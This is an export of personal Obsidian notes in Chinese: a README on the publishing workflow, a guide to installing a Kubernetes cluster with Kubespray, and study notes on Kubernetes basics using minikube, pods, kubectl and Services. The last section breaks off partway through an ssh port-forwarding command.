{"README":{"title":"README","links":[],"tags":["readme"],"content":"本仓库用于备份本地 Obsidian 的笔记文件，用于管理，组织个人笔记。为保证数据的兼容性，所有笔记尽量只使用 Markdown 的标准语法。\n下面介绍我的笔记发布流程。整个过程大致如下：\n\nObsidian 中编辑内容 →\n推送至私有仓库 →\n触发 action，将内容过滤筛选后以覆盖的形式推送至私有 quartz 仓库 →\n再次触发 action 构建页面并发布至 github page。\n\n其中只有最后的 github page 仓库是 public 的，这样做是为了避免对外展示不必要的内容。同时如果你的 Obsidian 的 valut 中包含很多体积较大的文件，那么可能并不适合使用 github 的个人免费版本，因为 lfs 的容量是有限的，可考虑搭建自己的 git 服务器。\n文章的发布使用了 quartz 项目，它可以将 md 文章生成静态页面，该项目基于 hugo，相比传统 hugo 主题，最大的不同是与 obsidian 的设计理念类似，以链接的形式串联你的知识。\n使用 quartz 时，若不希望文章被发布可在 md 中添加 metadata，这也是我使用最多的方式，其它方式可参考 Ignoring Notes。\ndraft:  true\n\n为什么我没有选择直接将原本的存放笔记的仓库和 quartz 合并？\n主要目的是不想改变已有的笔记仓库的结构，其次拆分增加了可操作性，毕竟目前 quartz 项目还处于快速迭代的阶段，可能会有许多问题。"},"archived/kubernetes/Kubernetes---Kubespray-安装-K8s-集群":{"title":"Kubespray 安装 Kubernetes 集群","links":["archived/kubernetes/Kubernetes-Kubespray-多架构下的安装","archived/kubernetes/Kubernetes-Kubespray-跨区域安装","til/installation/安装-Komodor-管理-Kubernetes-集群"],"tags":[],"content":"初始化\n首先克隆 kubespray 至本地，之后安装 ansible，官方文档推荐使用 python 的虚拟环境进行安装。主要执行以下命令前前不要切换至克隆的 kubespray 目录\nVENVDIR=kubespray-venv\nKUBESPRAYDIR=kubespray\npython3 -m venv $VENVDIR\nsource $VENVDIR/bin/activate\ncd $KUBESPRAYDIR\npip install -U -r requirements.txt\n执行完成后会进行虚拟 shell 环境。\n(kubespray-venv) trganda@hostname:~/kubespray$\n修改配置文件\n拷贝配置文件\ncp -rfp inventory/sample inventory/mycluster\n之后修改 inventory/mycluster 目录下的配置文件 hosts.yaml 和 inventory.ini，你也可以通过 kubespray 提供的脚步初始化这两个文件\ndeclare -a IPS=(10.10.1.3 10.10.1.4 10.10.1.5)\nCONFIG_FILE=inventory/mycluster/hosts.yaml python3 contrib/inventory_builder/inventory.py ${IPS[@]}\n注意替换对应的 ip 地址为自己的。\n检查 hosts.yaml 或 inventory.ini 文件，确保信息准确。\nhosts.yaml\n\nansible 支持多种格式，这里选择使用 yaml。\n\nhosts.yaml 文件中存储的是主机相关的信息，例如，IP 地址，用户名，私钥等。kubespray 会使用 ansible 根据 hosts.yaml 中的信息通过 ssh 连接至对应的主机。\n这里需要注意的是 ansible_host 和 ip 有一定的区别，ansible_host 使用 ssh 连接的地址，而 ip 是安装后 kubernetes 各个服务绑定的地址。所以如果你使用的是云主机，或弹性 IP，那么它的外部 IP 和内部 IP 地址是不一样的；此时若想从外部使用进行安装，则需要修改 ansible_host 为外部 IP。\n这里是直接在云主机内部环境中进行安装的。如果从外部安装，将 ansible_host 修改成公网地址，或者添加，并添加 access_ip\nall:\n  hosts:\n    node1:\n      ansible_host: x.x.x.x\n      ansible_user: ubuntu\n      ip: 10.0.0.5\n      access_ip: x.x.x.x\n      etcd_access_address: x.x.x.x\n    node2:\n      ansible_host: x.x.x.x\n      ansible_user: ubuntu\n      ip: 10.0.0.84\n      access_ip: x.x.x.x\n    node3:\n      ansible_host: x.x.x.x\n      ansible_user: ubuntu\n      ip: 10.0.0.242\n      access_ip: x.x.x.x\n    node4:\n      ansible_host: x.x.x.x\n      ansible_user: ubuntu\n      ip: 10.0.0.92\n      access_ip: x.x.x.x\n  children:\n    kube_control_plane:\n      hosts:\n        node1:\n    kube_node:\n      hosts:\n        node1:\n        node2:\n        node3:\n        node4:\n    etcd:\n      hosts:\n        node1:\n    k8s_cluster:\n      children:\n        kube_control_plane:\n        kube_node:\n    calico_rr:\n      hosts: {}\n根据官方文档，默认情况不需要修改如下内容，除非你知道自己在做什么。\nk8s_cluster:\n      children:\n        kube_control_plane:\n        kube_node:\n    calico_rr:\n      hosts: {}\n\n通常只需要更改 kube_control_plane、kube_node 和 etcd 中的节点就好。上面的配置文件中，指定 node1 作为 kube_control_plane；node1、node2、node3 作为 nodes；node1 作为 etcd 数据库的存储位置，当然你可以同时指定多个\netcd:\n  hosts:\n\tnode1:\n\tnode2:\n\tnode3:\n\n配置\n除了前面两个最基本的配置文件，还有很多其它的配置文件，毕竟 kuebernetes 相关的组件很多，并且还包括插件，如果需要进行定制则根据自身需要检查并修改这些文件。\n例如想使用 kubectl top 命令的功能，需要安装 metrics server，此时可在 inventory/mycluster/group_vars/k8s_cluster/addons.yml 文件中修改为如下配置\nmetrics_server_enabled: true\n\n如果想开启 dashboard 或 helm，也可在 addons.yml 中进行配置。\n安装\n确认好配置文件后，还有一件事需要做，你需要为各个主机指定同一个公钥『这样做更方便，只需使用一个私钥』，当然你也可以在 hosts.yaml 文件中为每一台机器指定私钥文件位置。\n首先创建一对密钥 key\nssh-keygen -t ed25519 -b 4096 -C &quot;xxx@mail.com&quot;\n之后将生成的公钥『id_ed25519.pub』copy 至远端主机，默认写入文件 ~/.ssh/authorized_keys 中。\nssh-copy-id -i ~/.ssh/id_ed25519.pub -f user@hostname\n-f 表示强制模式，如果 authorized_keys 中有相同的 key 则直接覆盖。\n对各个主机执行上述操作后，ansible 就可以使用同一个私钥连接至各个主机了。之后使用如下命令进行安装\nansible-playbook -i inventory/mycluster/hosts.yaml -b -v --private-key=~/.ssh/id_ed25519 cluster.yml\n如果各个机器之间的架构不同，例如混合着 x86、arm64 则会遇到问题，可参考 Kubernetes-Kubespray 多架构下的安装 进行解决。\n如果是跨区域的安装，例如混杂着云主机和 VPS，可以参考 Kubernetes-Kubespray 跨区域安装。\n管理\n对于不熟悉 kubernetes 的人来讲，比如我。而通过 UI 进行管理会更加方便，这里推荐使用 komodor，见 安装 Komodor 管理 Kubernetes 集群\n参考\n\nkubespray.io/#/docs/vars?id=other-service-variables『Configurable Parameters in Kubespray』\nkubespray.io/#/docs/ansible『Installing Ansible』\nkubespray.io/#/docs/setting-up-your-first-cluster『Setting up your first cluster with Kubespray』\n"},"archived/kubernetes/Kubernetes---Learn-Kubernetes-Basics":{"title":"Kubernetes - Learn Kubernetes Basics","links":["til/installation/Minikube-国区安装"],"tags":["k8s"],"content":"\n本文内容为官方文档的学习记录。\n\n官方文档提供了一个教程，学习以下内容：\n\n在集群中发布应用\n伸缩发布的应用\n更新发布的应用\n调试发布的应用\n\nKubernetes 介绍\nKubernetes 集群为主从模式，由 Control Plane『Master』 和 Node『Slave』 组成，\nControl Plane 负责管理集群，协调集群中的所有活动，例如调度应用程序、维护应用程序的所需状态、扩展应用程序以及更新。\nNode 可以看作是一台虚拟机或者物理机，它是 Kubernetes 集群中的工作节点。每个 Node 上包含一个 Kubelet 服务，它是一个 agent，用于与 Control Plane 通信『通过 Kubernetes API』。为了支持容器相关操作，Node 上还需要安装支持 CRI 的组件，例如 containerd、CRI-O 或是 Docker。\nKubernetes 安装\n在开始学习之前，先通过 minikube 项目在本地搭建一个 Kubernetes 集群，国区安装可参考 Minikube 国区安装 设置镜像。这里不必纠结 Kubernetes 的具体内容，先安装上手体验一下。\nminikube 是开源社区打造的本地化 Kubernetes 集群安装工具，对初学者很友好。\n\n安装 minikube 前需要先安装 Docker。\n\nMac 下可通过 brew 进行安装\nbrew install minikube\n之后启动一个集群\nminikube start\n使用 kubectl 工具查看集群中的 Nodes，输出如下\nkubectl get nodes\n// output\nNAME       STATUS   ROLES           AGE    VERSION\nminikube   Ready    control-plane   1m   v1.27.4\n如果本地没有安装 kubectl，可以参考 Install kubectl 进行安装，或者使用 minikube 中内嵌的 kubectl\nminikube kubectl -- get nodes\nKubernetes 的基本操作\n创建 Deployment\n安装并运行集群后，可以开始在集群中发布一个应用了。应用的发布需要依赖 Kubernetes Deployment，它用于告知 Kubernetes 如何创建或更新一个应用实例。当创建一个 Deployment 后，Control Plane 会开始编排并调度该应用至某个 Node 上。\n但应用实例被创建后，Deployment 会持续监控它的状态，如果应用被删除或意外停止，Depolyment 会创建另一个应用实例来替代它『自我修复机制』。\nKubernetes 提供了管理工具 kubectl，它通过 api 与集群控制中心进行交互。它的命令格式为 kubectl action resource，可通过 --help 命令查看可用 action 及参数。\n下面使用 kubectl 创建一个 Deployment，并指定通过镜像 kicbase/echo-server:1.0 来创建容器。这个镜像包含一个简单的 echo 服务。\nkubectl create deployment hello-node --image=kicbase/echo-server:1.0\n执行完成后，一个 Deployment 就创建好了。这个过程 Kubernetes 的做了以下几件事：\n\n寻找合适的 Node 用于创建并运行该应用实例。\n将应用编排到指定的 Node 上，也就是应用实例的创建和运行。\n配置集群在需要时在新的 Node 上重新安排实例，例如之前的应用挂了。\n\n此外，可通过如下命令查看默认命名空间下的 Deployment\nkubectl get deployments\n// output\nNAME         READY   UP-TO-DATE   AVAILABLE   AGE\nhello-node   1/1     1            1           7m22s\n\nPod 的概念\n在 Kubernetes 中 Node 并不是容器运行的最小单位，而是 Pod，Pod 中包含一个或多个的容器，它拥有独立的网络环境，通常一个 Pod 中的容器共享该 Pod 的网络环境和存储资源。默认情况下同一集群中的 Pod 和 Services『先忽略这个名词，知道有这么个东西就行』 互相可见，但并不对外部开放，也就是说无法从外部直接访问集群中的网络。当一个 Node 故障时，该 Node 中的所有 Pod 会迁移至集群中的其它 Node。\n前面通过 Deployment 创建的应用实例会运行在一个 Pod 中\nkubectl get pods\nNAME                          READY   STATUS    RESTARTS   AGE\nhello-node-6d5cf99b7b-gj5vx   1/1     Running   0          43m\n每个 Pod 都有自己的 IP『集群 IP』，外部想和集群内的网络通信，需要使用代理或其它手段。kubectl proxy 命令可在 localhost 和集群的 api server 直接创建一个代理，允许从 localhost 访问集群的 api server。\n// 默认端口为 8001\nkubectl proxy -p 8001\n之后访问该端口，输出如下\ncurl http://localhost:8001/version\n// output\n{\n  &quot;major&quot;: &quot;1&quot;,\n  &quot;minor&quot;: &quot;27&quot;,\n  &quot;gitVersion&quot;: &quot;v1.27.4&quot;,\n  &quot;gitCommit&quot;: &quot;fa3d7990104d7c1f16943a67f11b154b71f6a132&quot;,\n  &quot;gitTreeState&quot;: &quot;clean&quot;,\n  &quot;buildDate&quot;: &quot;2023-07-19T12:14:49Z&quot;,\n  &quot;goVersion&quot;: &quot;go1.20.6&quot;,\n  &quot;compiler&quot;: &quot;gc&quot;,\n  &quot;platform&quot;: &quot;linux/arm64&quot;\n}\n同时，kubectl proxy 命令会为每个 Pod 创建一个 Endpoint『可以理解成 ip:port，但并不等同，Endpoint 是一个抽象概念』，允许通过 Pod 的名称来访问该 Pod。\n// 如果你本地有多个 Pod，由于格式问题后面 curl 会失败\nexport POD_NAME=$(kubectl get pods -o go-template --template &#039;{{range .items}}{{.metadata.name}}{{&quot;\\n&quot;}}{{end}}&#039;)\necho Name of the Pod: $POD_NAME\n// 访问该 Pod，这里为 hello-node-6d5cf99b7b-gj5vx\ncurl http://localhost:8001/api/v1/namespaces/default/pods/$POD_NAME/\n返回内容如下\n{\n  &quot;kind&quot;: &quot;Pod&quot;,\n  &quot;apiVersion&quot;: &quot;v1&quot;,\n  &quot;metadata&quot;: {\n    &quot;name&quot;: &quot;hello-node-6d5cf99b7b-gj5vx&quot;,\n    &quot;generateName&quot;: &quot;hello-node-6d5cf99b7b-&quot;,\n    &quot;namespace&quot;: &quot;default&quot;,\n    &quot;uid&quot;: &quot;2c9c06ca-8b2a-4126-b295-5abf39ee254a&quot;,\n    &quot;resourceVersion&quot;: &quot;14973&quot;,\n    &quot;creationTimestamp&quot;: &quot;2023-09-28T01:40:23Z&quot;,\n    &quot;labels&quot;: {\n      &quot;app&quot;: &quot;hello-node&quot;,\n      &quot;pod-template-hash&quot;: &quot;6d5cf99b7b&quot;\n    },\n    &quot;ownerReferences&quot;: [\n      {\n        &quot;apiVersion&quot;: &quot;apps/v1&quot;,\n        &quot;kind&quot;: &quot;ReplicaSet&quot;,\n        &quot;name&quot;: &quot;hello-node-6d5cf99b7b&quot;,\n        &quot;uid&quot;: &quot;07f89c5e-4da4-4800-b92d-ee132fe4f178&quot;,\n        &quot;controller&quot;: true,\n        &quot;blockOwnerDeletion&quot;: true\n      }\n    ],\n    &quot;managedFields&quot;: [\n      {\n        &quot;manager&quot;: &quot;kube-controller-manager&quot;,\n        &quot;operation&quot;: &quot;Update&quot;,\n        &quot;apiVersion&quot;: &quot;v1&quot;,\n        &quot;time&quot;: &quot;2023-09-28T01:40:23Z&quot;,\n        &quot;fieldsType&quot;: &quot;FieldsV1&quot;,\n        &quot;fieldsV1&quot;: {\n          &quot;f:metadata&quot;: {\n            &quot;f:generateName&quot;: {},\n            &quot;f:labels&quot;: {\n              &quot;.&quot;: {},\n              &quot;f:app&quot;: {},\n              &quot;f:pod-template-hash&quot;: {}\n            },\n            &quot;f:ownerReferences&quot;: {\n              &quot;.&quot;: {},\n              &quot;k:{\\&quot;uid\\&quot;:\\&quot;07f89c5e-4da4-4800-b92d-ee132fe4f178\\&quot;}&quot;: {}\n            }\n          },\n          &quot;f:spec&quot;: {\n            &quot;f:containers&quot;: {\n              &quot;k:{\\&quot;name\\&quot;:\\&quot;echo-server\\&quot;}&quot;: {\n                &quot;.&quot;: {},\n                &quot;f:image&quot;: {},\n                &quot;f:imagePullPolicy&quot;: {},\n                &quot;f:name&quot;: {},\n                &quot;f:resources&quot;: {},\n                &quot;f:terminationMessagePath&quot;: {},\n                &quot;f:terminationMessagePolicy&quot;: {}\n              }\n            },\n            &quot;f:dnsPolicy&quot;: {},\n            &quot;f:enableServiceLinks&quot;: {},\n            &quot;f:restartPolicy&quot;: {},\n            &quot;f:schedulerName&quot;: {},\n            &quot;f:securityContext&quot;: {},\n            &quot;f:terminationGracePeriodSeconds&quot;: {}\n          }\n        }\n      },\n      {\n        &quot;manager&quot;: &quot;kubelet&quot;,\n        &quot;operation&quot;: &quot;Update&quot;,\n        &quot;apiVersion&quot;: &quot;v1&quot;,\n        &quot;time&quot;: &quot;2023-09-28T01:40:31Z&quot;,\n        &quot;fieldsType&quot;: &quot;FieldsV1&quot;,\n        &quot;fieldsV1&quot;: {\n          &quot;f:status&quot;: {\n            &quot;f:conditions&quot;: {\n              &quot;k:{\\&quot;type\\&quot;:\\&quot;ContainersReady\\&quot;}&quot;: {\n                &quot;.&quot;: {},\n                &quot;f:lastProbeTime&quot;: {},\n                &quot;f:lastTransitionTime&quot;: {},\n                &quot;f:status&quot;: {},\n                &quot;f:type&quot;: {}\n              },\n              &quot;k:{\\&quot;type\\&quot;:\\&quot;Initialized\\&quot;}&quot;: {\n                &quot;.&quot;: {},\n                &quot;f:lastProbeTime&quot;: {},\n                &quot;f:lastTransitionTime&quot;: {},\n                &quot;f:status&quot;: {},\n                &quot;f:type&quot;: {}\n              },\n              &quot;k:{\\&quot;type\\&quot;:\\&quot;Ready\\&quot;}&quot;: {\n                &quot;.&quot;: {},\n                &quot;f:lastProbeTime&quot;: {},\n                &quot;f:lastTransitionTime&quot;: {},\n                &quot;f:status&quot;: {},\n                &quot;f:type&quot;: {}\n              }\n            },\n            &quot;f:containerStatuses&quot;: {},\n            &quot;f:hostIP&quot;: {},\n            &quot;f:phase&quot;: {},\n            &quot;f:podIP&quot;: {},\n            &quot;f:podIPs&quot;: {\n              &quot;.&quot;: {},\n              &quot;k:{\\&quot;ip\\&quot;:\\&quot;10.244.0.7\\&quot;}&quot;: {\n                &quot;.&quot;: {},\n                &quot;f:ip&quot;: {}\n              }\n            },\n            &quot;f:startTime&quot;: {}\n          }\n        },\n        &quot;subresource&quot;: &quot;status&quot;\n      }\n    ]\n  },\n  &quot;spec&quot;: {\n    &quot;volumes&quot;: [\n      {\n        &quot;name&quot;: &quot;kube-api-access-ch42v&quot;,\n        &quot;projected&quot;: {\n          &quot;sources&quot;: [\n            {\n              &quot;serviceAccountToken&quot;: {\n                &quot;expirationSeconds&quot;: 3607,\n                &quot;path&quot;: &quot;token&quot;\n              }\n            },\n            {\n              &quot;configMap&quot;: {\n                &quot;name&quot;: &quot;kube-root-ca.crt&quot;,\n                &quot;items&quot;: [\n                  {\n                    &quot;key&quot;: &quot;ca.crt&quot;,\n                    &quot;path&quot;: &quot;ca.crt&quot;\n                  }\n                ]\n              }\n            },\n            {\n              &quot;downwardAPI&quot;: {\n                &quot;items&quot;: [\n                  {\n                    &quot;path&quot;: &quot;namespace&quot;,\n                    &quot;fieldRef&quot;: {\n                      &quot;apiVersion&quot;: &quot;v1&quot;,\n                      &quot;fieldPath&quot;: &quot;metadata.namespace&quot;\n                    }\n                  }\n                ]\n              }\n            }\n          ],\n          &quot;defaultMode&quot;: 420\n        }\n      }\n    ],\n    &quot;containers&quot;: [\n      {\n        &quot;name&quot;: &quot;echo-server&quot;,\n        &quot;image&quot;: &quot;kicbase/echo-server:1.0&quot;,\n        &quot;resources&quot;: {},\n        &quot;volumeMounts&quot;: [\n          {\n            &quot;name&quot;: &quot;kube-api-access-ch42v&quot;,\n            &quot;readOnly&quot;: true,\n            &quot;mountPath&quot;: &quot;/var/run/secrets/kubernetes.io/serviceaccount&quot;\n          }\n        ],\n        &quot;terminationMessagePath&quot;: &quot;/dev/termination-log&quot;,\n        &quot;terminationMessagePolicy&quot;: &quot;File&quot;,\n        &quot;imagePullPolicy&quot;: &quot;IfNotPresent&quot;\n      }\n    ],\n    &quot;restartPolicy&quot;: &quot;Always&quot;,\n    &quot;terminationGracePeriodSeconds&quot;: 30,\n    &quot;dnsPolicy&quot;: &quot;ClusterFirst&quot;,\n    &quot;serviceAccountName&quot;: &quot;default&quot;,\n    &quot;serviceAccount&quot;: &quot;default&quot;,\n    &quot;nodeName&quot;: &quot;minikube&quot;,\n    &quot;securityContext&quot;: {},\n    &quot;schedulerName&quot;: &quot;default-scheduler&quot;,\n    &quot;tolerations&quot;: [\n      {\n        &quot;key&quot;: &quot;node.kubernetes.io/not-ready&quot;,\n        &quot;operator&quot;: &quot;Exists&quot;,\n        &quot;effect&quot;: &quot;NoExecute&quot;,\n        &quot;tolerationSeconds&quot;: 300\n      },\n      {\n        &quot;key&quot;: &quot;node.kubernetes.io/unreachable&quot;,\n        &quot;operator&quot;: &quot;Exists&quot;,\n        &quot;effect&quot;: &quot;NoExecute&quot;,\n        &quot;tolerationSeconds&quot;: 300\n      }\n    ],\n    &quot;priority&quot;: 0,\n    &quot;enableServiceLinks&quot;: true,\n    &quot;preemptionPolicy&quot;: &quot;PreemptLowerPriority&quot;\n  },\n  &quot;status&quot;: {\n    &quot;phase&quot;: &quot;Running&quot;,\n    &quot;conditions&quot;: [\n      {\n        &quot;type&quot;: &quot;Initialized&quot;,\n        &quot;status&quot;: &quot;True&quot;,\n        &quot;lastProbeTime&quot;: null,\n        &quot;lastTransitionTime&quot;: &quot;2023-09-28T01:40:23Z&quot;\n      },\n      {\n        &quot;type&quot;: &quot;Ready&quot;,\n        &quot;status&quot;: &quot;True&quot;,\n        &quot;lastProbeTime&quot;: null,\n        &quot;lastTransitionTime&quot;: &quot;2023-09-28T01:40:31Z&quot;\n      },\n      {\n        &quot;type&quot;: &quot;ContainersReady&quot;,\n        &quot;status&quot;: &quot;True&quot;,\n        &quot;lastProbeTime&quot;: null,\n        &quot;lastTransitionTime&quot;: &quot;2023-09-28T01:40:31Z&quot;\n      },\n      {\n        &quot;type&quot;: &quot;PodScheduled&quot;,\n        &quot;status&quot;: &quot;True&quot;,\n        &quot;lastProbeTime&quot;: null,\n        &quot;lastTransitionTime&quot;: &quot;2023-09-28T01:40:23Z&quot;\n      }\n    ],\n    &quot;hostIP&quot;: &quot;192.168.49.2&quot;,\n    &quot;podIP&quot;: &quot;10.244.0.7&quot;,\n    &quot;podIPs&quot;: [\n      {\n        &quot;ip&quot;: &quot;10.244.0.7&quot;\n      }\n    ],\n    &quot;startTime&quot;: &quot;2023-09-28T01:40:23Z&quot;,\n    &quot;containerStatuses&quot;: [\n      {\n        &quot;name&quot;: &quot;echo-server&quot;,\n        &quot;state&quot;: {\n          &quot;running&quot;: {\n            &quot;startedAt&quot;: &quot;2023-09-28T01:40:31Z&quot;\n          }\n        },\n        &quot;lastState&quot;: {},\n        &quot;ready&quot;: true,\n        &quot;restartCount&quot;: 0,\n        &quot;image&quot;: &quot;kicbase/echo-server:1.0&quot;,\n        &quot;imageID&quot;: &quot;docker-pullable://kicbase/echo-server@sha256:127ac38a2bb9537b7f252addff209ea6801edcac8a92c8b1104dacd66a583ed6&quot;,\n        &quot;containerID&quot;: &quot;docker://c6aa05f95996db36880534bd94c75ffd3b375048528c6cbd2eee5b7b6b827354&quot;,\n        &quot;started&quot;: true\n      }\n    ],\n    &quot;qosClass&quot;: &quot;BestEffort&quot;\n  }\n}\n那么如何访问前面创建的 echo 服务呢？echo 服务默认监听端口为 8080，在使用 kubectl proxy 后通过如下接口即可访问『这种方式并不优雅，后面会学习如何暴露 Pod 中的应用』\ncurl http://localhost:8001/api/v1/namespaces/default/pods/$POD_NAME:8080/proxy/\n// output\nRequest served by hello-node-6d5cf99b7b-gj5vx\n \nHTTP/1.1 GET /\n \nHost: 127.0.0.1:58325\nAccept: */*\nAccept-Encoding: gzip\nUser-Agent: curl/8.1.2\nX-Forwarded-For: 127.0.0.1, 192.168.49.1\nX-Forwarded-Uri: /api/v1/namespaces/default/pods/hello-node-6d5cf99b7b-gj5vx:8080/proxy/\nkubectl 是如何与集群交互的呢？虽然前面提了是通过使用 api，那它是如何从外部访问集群 api 的呢？\n自然不会通过 kubectl proxy，毕竟要执行该命令，首先就要能够访问 api。Kubernetes 的 api 服务默认监听在 6443 端口，并且对外部开放『一定要配置认证机制』，minikube 略有不同，当通过 minikube 安装集群后，minikube 会监听端口 58325\n\n查看当前 kuberconfig 配置文件『位于 ~/.kube/config』，你可以使用如下命令查看它\nkubectl config view\n// output\napiVersion: v1\n- cluster:\n    certificate-authority: /Users/trganda/.minikube/ca.crt\n    extensions:\n    - extension:\n        last-update: Wed, 27 Sep 2023 14:56:42 CST\n        provider: minikube.sigs.k8s.io\n        version: v1.31.2\n      name: cluster_info\n    server: https://127.0.0.1:58325\n  name: minikube\nNode 的概念\nNode 是集群中的工作节点，承载着运行 Pod 的任务，它可以是虚拟机也可以是物理机器。控制中心通过调度策略在不同 Node 之间调度 Pod，每一个 Node 至少包含以下服务：\n\nKubelet，Kuberentes 中的 Agent，负责与控制中心通信，并管理当前 Node 中的 Pod。\n容器运行时环境『例如 Docker』，复杂拉取镜像，创建容器并运行容器。\n\n查看 Pods 和 Nodes\nkubectl 提供了一系列命令用于查看 Pod 和 Node 的信息。\n\nkubectl get：列出资源\nkubectl describe：查看资源的详细信息\nkubectl logs：查看 Pod 中容器的日志信息\nkubectl exec：在 Pod 中的容器中执行命令\n\n下面以前面创建的 echo 服务进行演示，\n查看 Pod\nkubectl get pods\nNAME                          READY   STATUS    RESTARTS   AGE\nhello-node-6d5cf99b7b-gj5vx   1/1     Running   0          62m\n查看 Pod 的详细信息\nkubectl describe pods\nName:             hello-node-6d5cf99b7b-gj5vx\nNamespace:        default\nPriority:         0\nService Account:  default\nNode:             minikube/192.168.49.2\nStart Time:       Thu, 28 Sep 2023 09:40:23 +0800\nLabels:           app=hello-node\n                  pod-template-hash=6d5cf99b7b\nAnnotations:      &lt;none&gt;\nStatus:           Running\nIP:               10.244.0.7\nIPs:\n  IP:           10.244.0.7\nControlled By:  ReplicaSet/hello-node-6d5cf99b7b\nContainers:\n  echo-server:\n    Container ID:   docker://c6aa05f95996db36880534bd94c75ffd3b375048528c6cbd2eee5b7b6b827354\n    Image:          kicbase/echo-server:1.0\n    Image ID:       docker-pullable://kicbase/echo-server@sha256:127ac38a2bb9537b7f252addff209ea6801edcac8a92c8b1104dacd66a583ed6\n    Port:           &lt;none&gt;\n    Host Port:      &lt;none&gt;\n    State:          Running\n      Started:      Thu, 28 Sep 2023 09:40:31 +0800\n    Ready:          True\n    Restart Count:  0\n    Environment:    &lt;none&gt;\n    Mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-ch42v (ro)\nConditions:\n  Type              Status\n  Initialized       True\n  Ready             True\n  ContainersReady   True\n  PodScheduled      True\nVolumes:\n  kube-api-access-ch42v:\n    Type:                    Projected (a volume that contains injected data from multiple sources)\n    TokenExpirationSeconds:  3607\n    ConfigMapName:           kube-root-ca.crt\n    ConfigMapOptional:       &lt;nil&gt;\n    DownwardAPI:             true\nQoS Class:                   BestEffort\nNode-Selectors:              &lt;none&gt;\nTolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s\n                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s\nEvents:                      &lt;none&gt;\n查看指定 Pod 的详细信息\nkubectl describe pod hello-node-6d5cf99b7b-gj5vx\n查看 Pod 中容器的日志，如果 Pod 中只有一个容器，则可以直接指定 Pod 的名称\nkubectl logs hello-node-6d5cf99b7b-gj5vx\nEcho server listening on port 8080.\n10.244.0.1:54962 | GET /\n或者显示指定容器名\nkubectl logs hello-node-6d5cf99b7b-gj5vx -c echo-server\nEcho server listening on port 8080.\n10.244.0.1:54962 | GET /\n在容器中执行命令，类似地，如果 Pod 中只有一个容器，则可以直接指定 Pod 的名称\nkubectl exec hello-node-6d5cf99b7b-gj5vx -- env\n// 显示指定容器名\nkubectl exec hello-node-6d5cf99b7b-gj5vx -c echo-server -- env\n\necho server 所用镜像中没有 env 命令，这里只是演示\n\n交互模式启动 shell\nkubectl exec -ti hello-node-6d5cf99b7b-gj5vx -c echo-server -- bash\n使用 Service 暴露服务\n前面提到 Pod 只拥有集群内部的 IP 地址，在创建应用后外部并没有办法直接访问它。虽然可以通过 kubectl proxy 以代理的形式进行访问，但这样做有一些问题。\n首先 Pod 有自己的生命周期，当 Pod 自身出现故障或所处 Node 出现故障，Pod 会在集群的其它地方被恢复，那么它的名称就可能发生变化，分配的集群 IP 也是如此。很明显，kubectl proxy 这种与 Pod 强绑定的方式不够灵活，也不易于维护。\n为此 Kuberentes 中提供了一项功能 Services，它是服务的抽象概念，Services 可以与一个或一组 Pod 关联，它负责查找协调与之关联的 Pod 的变更，对外部隐藏 Pod 的变化。这样只要知道 Services 的信息就可以访问 Pod 中提供的服务，而不需要关心 Pod 是否出现故障，是否被恢复或迁移，甚至扩容。\nServices 通过 Labels 和 Selector，也就是标签的形式来确定与之关联的 Pod『通过 yaml 配置文件中的 selector 字段指定』，这也是 Kubernetes 所有资源对象最常用的方式，下图展示了 Service 使用标签来确定与之关联的 Pod。\n\n在图中，只有标签与 Service 的 Selector 指定的标签相同的 Pod 才会被选中。\n创建 Services\n下面尝试为 Pod 创建一个 Service，先查看当前 Pod\nkubectl get pods\nNAME                          READY   STATUS    RESTARTS   AGE\nhello-node-6d5cf99b7b-gj5vx   1/1     Running   0          134m\n为该 Pod 创建一个类型为 NodePort 的 Service\nkubectl expose deployment hello-node --type=&quot;NodePort&quot; --port=8080\n上面的命令表示暴露名称为 hello-node 的 Deployment，--port 指定创建的 Service 的应服务的端口，如果不指定则从待暴露的资源中复制『如果存在』，也就是从 hello-node 中获取。\n创建之后可通过如下命令查看当前的 Services\n\nkubernetes 是 minikube 默认创建的 service。\n\nkubectl get services\n \nNAME         TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)          AGE\nhello-node   NodePort    10.111.18.163   &lt;none&gt;        8080:30255/TCP   171m\nkubernetes   ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP          23h\n现在来查看 hello-node 的详细信息，NodePort 模式对外暴露的端口是 30255\nkubectl describe services hello-node\nName:                     hello-node\nNamespace:                default\nLabels:                   app=hello-node\nAnnotations:              &lt;none&gt;\nSelector:                 app=hello-node\nType:                     NodePort\nIP Family Policy:         SingleStack\nIP Families:              IPv4\nIP:                       10.111.18.163\nIPs:                      10.111.18.163\nPort:                     &lt;unset&gt;  8080/TCP\nTargetPort:               8080/TCP\nNodePort:                 &lt;unset&gt;  30255/TCP\nEndpoints:                10.244.0.7:8080\nSession Affinity:         None\nExternal Traffic Policy:  Cluster\nEvents:                   &lt;none&gt;\n接下来就可以使用 Node 的 IP+NodePort 来访问该 Service 了，不过由于本地 minikube 是安装在 Docker 环境中的，minikube 无法在运行时动态添加对外暴露的端口，所以你会发现本地并没有任何进程在监听 NodePort=30255\n为此需要使用 minikube 提供的命令\nminikube service hello-node --url\nhttp://127.0.0.1:61761\n❗  Because you are using a Docker driver on darwin, the terminal needs to be open to run it.\n之后再访问 http://127.0.0.1:61761，即可访问刚刚创建的 Service\nMinikube Service 是如何工作的\n查看 61761 关联的进程 PID\nlsof -i :61761\nCOMMAND   PID    USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME\nssh     27471 trganda    5u  IPv6 0x6fc015fbc2e813d5      0t0  TCP localhost:61761 (LISTEN)\nssh     27471 trganda    6u  IPv4 0x6fc015f21cbfea85      0t0  TCP localhost:61761 (LISTEN)\n查看相应进程\nps aux | grep 27471\ntrganda          27471   0.0  0.0 408657984   4272 s011  S+   11:32AM   0:00.01 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o IdentitiesOnly=yes -N docker@127.0.0.1 -p 58321 -i /Users/trganda/.minikube/machines/minikube/id_rsa -L 61761:10.111.18.163:8080\n可以看到执行的命令如下，下面这段命令通过 ssh 的端口转发功能，将本地的 61761 端口转发至 10.111.18.163 的 8080 端口。其中 10.111.18.163 是刚刚创建的 Service 的 IP 地址。\nssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o IdentitiesOnly=yes -N docker@127.0.0.1 -p 58321 -i /Users/trganda/.minikube/machines/minikube/id_rsa -L 